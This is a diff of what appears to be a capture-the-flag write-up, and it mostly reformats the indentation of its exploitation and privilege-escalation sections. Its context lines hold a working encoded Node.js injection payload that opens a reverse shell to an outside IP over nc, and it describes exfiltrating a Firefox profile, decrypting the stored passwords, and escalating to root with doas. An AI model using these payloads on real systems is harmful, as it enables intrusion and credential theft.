@@ -99,25 +99,26 @@ cmd parameter injectable
  
     POST /api/items?cmd=require("child_process").exec("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E21%2E157%2E185%204444%20%3E%2Ftmp%2Ff") HTTP/1.1
 
-     Reverse shell received as user
+    Reverse shell received as user
 
 ----
 
 ## 6. Privilege Escalation
 
-    Method: 
+    
+Method: 
 
-    Stole Firefox profile via tar | nc
-    Extracted passwords using firefox_decrypt.py
+Stole Firefox profile via tar | nc
+Extracted passwords using firefox_decrypt.py
 
 
-    Tool Used: LinPEAS
+Tool Used: LinPEAS
 
-    Commands:
- 
+Commands:
+ ```
    Find / -perm -4000 2>/dev/null
    doas -u root /bin/bash
-
+```
 
 Escalated To: root
 
